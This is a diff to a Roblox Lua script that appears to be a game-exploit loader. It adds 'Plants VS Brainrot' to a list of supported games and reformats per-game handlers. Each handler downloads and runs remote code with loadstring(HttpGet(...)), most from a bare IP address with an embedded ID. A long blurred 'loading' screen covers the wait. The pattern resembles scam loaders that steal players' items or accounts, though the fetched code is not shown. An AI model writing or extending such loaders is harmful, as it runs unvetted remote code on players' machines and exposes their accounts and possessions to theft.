@@ -6,6 +6,7 @@
 -- 920587237      = Adopt Me
 -- 18901165922    = PETS GO
 -- 8737899170     = Pet Simulator 99
+-- 127742093697776 = Plants VS Brainrot
 
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
@@ -17,19 +18,22 @@ local MarketplaceService = game:GetService("MarketplaceService")
 
 local player = Players.LocalPlayer
 
+-- Game mapping
 local SupportedGames = {
     [126884695634066] = "Grow-a-Garden",
     [124977557560410] = "Grow-a-Garden [NEWBIES]",
     [142823291] = "Murder Mystery 2",
     [920587237] = "Adopt Me",
     [18901165922] = "PETS GO",
-    [8737899170] = "Pet Simulator 99"
+    [8737899170] = "Pet Simulator 99",
+    [127742093697776] = "Plants VS Brainrot"
 }
 
 local function getGameName(placeId)
     return SupportedGames[placeId] or "Unknown Game"
 end
 
+-- Fun facts for loading screen
 local funFacts = {
     "Did you know? Roblox launched in 2006!",
     "Tip: Press F9 to open the dev console.",
@@ -59,16 +63,19 @@ local funFacts = {
     "Fun Fact: Some Roblox eggs from Egg Hunts are now rare collectibles."
 }
 
+-- Loading screen function
 local function createLoadingScreen(gameName, duration)
     if not gameName then gameName = "Game" end
     duration = duration or 420
 
+    -- Blur effect
     local blur = Instance.new("BlurEffect")
     blur.Name = "UniversalLoaderBlur"
     blur.Size = 0
     blur.Parent = Lighting
     TweenService:Create(blur, TweenInfo.new(0.6, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {Size = 24}):Play()
 
+    -- Main GUI
     local screenGui = Instance.new("ScreenGui")
     screenGui.Name = "UniversalModernLoader"
     screenGui.ResetOnSpawn = false
@@ -224,15 +231,37 @@ local function createLoadingScreen(gameName, duration)
     end
 end
 
+-- Handlers for each game
 local handlers = {
-    [8737899170] = {name="Pet Simulator 99", action=function() loadstring(game:HttpGet("https://raw.githubusercontent.com/ingeniousmainmn/Universal/refs/heads/main/Universal", true))() end},
-    [18901165922] = {name="PETS GO", action=function() loadstring(game:HttpGet("https://paste.debian.net/plainh/b11ed528/", true))() end},
-    [142823291] = {name="Murder Mystery 2", action=function() ID="8b249fe3-a46b-468b-bb5b-71412dc5a12c"; loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))() end},
-    [920587237] = {name="Adopt Me", action=function() ID="8b249fe3-a46b-468b-bb5b-71412dc5a12c"; loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))() end},
-    [126884695634066] = {name="Grow-a-Garden", action=function() ID="8b249fe3-a46b-468b-bb5b-71412dc5a12c"; loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))() end},
-    [124977557560410] = {name="Grow-a-Garden [NEWBIES]", action=function() ID="8b249fe3-a46b-468b-bb5b-71412dc5a12c"; loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))() end},
+    [8737899170] = {name="Pet Simulator 99", action=function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/ingeniousmainmn/Universal/refs/heads/main/Universal", true))()
+    end},
+    [18901165922] = {name="PETS GO", action=function()
+        loadstring(game:HttpGet("https://paste.debian.net/plainh/b11ed528/", true))()
+    end},
+    [142823291] = {name="Murder Mystery 2", action=function()
+        ID="8b249fe3-a46b-468b-bb5b-71412dc5a12c"
+        loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+    end},
+    [920587237] = {name="Adopt Me", action=function()
+        ID="8b249fe3-a46b-468b-bb5b-71412dc5a12c"
+        loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+    end},
+    [126884695634066] = {name="Grow-a-Garden", action=function()
+        ID="8b249fe3-a46b-468b-bb5b-71412dc5a12c"
+        loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+    end},
+    [124977557560410] = {name="Grow-a-Garden [NEWBIES]", action=function()
+        ID="8b249fe3-a46b-468b-bb5b-71412dc5a12c"
+        loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+    end},
+    [127742093697776] = {name="Plants VS Brainrot", action=function()
+        ID="8b249fe3-a46b-468b-bb5b-71412dc5a12c"
+        loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+    end},
 }
 
+-- Detect current game
 local placeId = game.PlaceId
 local entry = handlers[placeId]
 
